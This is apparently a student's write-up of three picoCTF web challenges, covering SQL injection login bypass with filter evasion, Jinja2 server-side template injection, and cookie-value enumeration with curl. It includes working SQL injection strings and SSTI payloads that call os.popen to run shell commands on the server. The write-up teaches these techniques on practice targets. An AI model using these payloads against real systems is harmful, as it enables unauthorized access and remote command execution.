# 1. Web Gauntlet
> Log into http://shape-facility.picoctf.net:60454/index.php as the admin using SQL injections in rounds to get the flag.

## Solution:
- The site is a login page where we can enter username and password. Usually such sites can be accessed using SQL injection with admin or 1=1 commands.
- The filter page showed the words/characters blocked by the site. So keeping those in mind gave admin'-- injection because 'or' was blocked.
- Round 2 blocked and, like,=,--. Next injection- admin' /*.
- Round 3 blocked ><. Next- admin';.
- Round 4 blocked admin. Next- ad'||'min';. Used concatenation operator to make the word 'admin'.
- Round 5 blocked union but the previous injection still worked.
- The complete source code was on the filter page with the flag at the end as comment.

##  Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```
## Concepts Learnt:
- SQL injection can be done when a site asks for user input, like their username/userid, and instead of a name/id, an SQL statement can be run unknowingly on database.
- The SQL injection 1=1 is valid and will return all values, since OR 1=1 is always true. This can give access to such sites without the need of passwords.

## Notes:
- I did not understand the purpose of the filter page, and therefore tried to use 'or' with admin and 1=1 in round 1. But when that didn't give me access, I read the address of the page along with the given hints and realised that it indicated the filters blocked for the round.

# 2. SSTI1
> Website http://rescued-float.picoctf.net:56154/ where you can announce whatever you want. Use the interface to get the flag.

## Solution:
- Usual primitive vulnerability, also taking from the title, SSTI can be used to work the site like a terminal.
- Check {{7*7}} as input, if output=49, SSTI vulnerability.
- Within SSTI, for different templates there are different ouputs.
- {{7*'7'}} gives 7777777 which confirms Jinja2 template.
- Giving python suitable payloads due to Jinja2 template, use ls command to list all files:-
  ```
  {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}.
  ```
- Got this output

- Used cat command to get the flag:-
  ```
  {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
  ```
- This gave the flag
## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```
## Concepts Learnt:
- Server-side template injection attack (SSTI) is when a template’s native syntax is exploited and injected with malicious payloads.
- Template could be Jinja2, Twig or ERB.
- {{7*7}} gives error in ERB and 49 in rest.
- {{7*’7’}} reults in 7777777 in Jinja2 and 49 in Twig and error in ERB.
- ERB gives output 49 for <%=7*7%> and rest give error.
- For payload format- `{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}` 'request' is a global object, 'applications' is a property of the global object.
- 'globals' accesses all the variables of request.application global object.
- 'builtins' all of Python's built-in functions, such as print(), len(), and import.
- The 'os' module is a standard Python library for interacting with the operating system like reading files and running commands.
- .popen() opens a pipe to or from a shell command i.e. it executes a command on the server's command line.
- .read() reads the entire output from that pipe as a single string.
## Notes: 
- I was aware of {{7*7}} giving 49 to check for SSTI vulnerabiliy. For this challenge, I searched to find out templates of SSTI and use different tests for each template.

# 3. Cookies
> Try to figure out the best cookie in this site http://mercury.picoctf.net:6418/ to get the flag.
## Solution:
- Trying snickerdoodle changed the cookie name value from -1 to 0.
- This did not give the flag.
  <img width="1920" height="1080" alt="Screenshot (150)" src="https://github.com/user-attachments/assets/6f79015e-6557-4adf-afa5-2beee0508410" />
- Used curl command with -sH and cookie name=0 for to send the request to the url and from its output, use grep -oE to get output similar to <b>...</b> which can get me the statement.
- This showed the message "I love snickerdoodle cookies!".
- Then I extracted the same output for an iteration from index 0 to 20.
- Found out that at name=18, the site prints the flag.
- Then I changed the name value to 18 on site and got the flag.

```
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi$ curl mercury.picoctf.net:6418/check -sH 'Cookie: name=0' | grep -oE '<b>.*?</b>'
<b>I love snickerdoodle cookies!</b>
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi$ for i in {0..20}; do echo -n "$i: "; curl mercury.picoctf.net:6418/check -sH "Cookie: name=$i" | grep -oE '<b>.*?</b>'; done
0: <b>I love snickerdoodle cookies!</b>
1: <b>I love chocolate chip cookies!</b>
2: <b>I love oatmeal raisin cookies!</b>
3: <b>I love gingersnap cookies!</b>
4: <b>I love shortbread cookies!</b>
5: <b>I love peanut butter cookies!</b>
6: <b>I love whoopie pie cookies!</b>
7: <b>I love sugar cookies!</b>
8: <b>I love molasses cookies!</b>
9: <b>I love kiss cookies!</b>
10: <b>I love biscotti cookies!</b>
11: <b>I love butter cookies!</b>
12: <b>I love spritz cookies!</b>
13: <b>I love snowball cookies!</b>
14: <b>I love drop cookies!</b>
15: <b>I love thumbprint cookies!</b>
16: <b>I love pinwheel cookies!</b>
17: <b>I love wafer cookies!</b>
18: <b>Flag</b>
19: <b>I love macaroon cookies!</b>
20: <b>I love fortune cookies!</b>
```
## Flag:
```
picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
```
## Concepts Learnt:
- curl: The command-line tool used to send requests to a server.
- -sH: only response for adding a custom HTTP header, Cookie header in this case. This sends a browser cookie to the site.
- -oE: only show matching part with '+,?,`' allowed.
- Loops can be createdin bash terminal for appropriate commands.
## Note:
- I tried changing name values from -1 onwards. But this won't work if name value is very large. So I found the output of all iterations first.
